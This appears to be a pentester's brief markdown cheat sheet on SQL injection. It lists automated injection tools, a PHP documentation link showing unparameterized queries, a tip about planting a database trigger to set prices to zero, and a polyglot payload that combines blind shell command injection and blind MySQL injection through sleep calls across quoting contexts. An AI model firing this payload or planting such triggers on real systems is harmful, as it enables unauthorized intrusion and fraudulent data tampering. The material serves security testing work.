# tools

- AutoSQLi: https://github.com/jesuiscamille/AutoSQLi
- SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/
- Automatic SQL injection with Charles and sqlmap api
  - http://0r1.me/SQLiScanner/
  - https://github.com/0xbug/SQLiScanner

# PHP

- Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/)

# Payload

Combines blind command injection and blind sql injection ( mysql ) in one payload (works with no quotes/single quotes and double quotes):
```
/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
```
> https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065

# Techniques
- Add a trigger to do a malicious action (price 0)
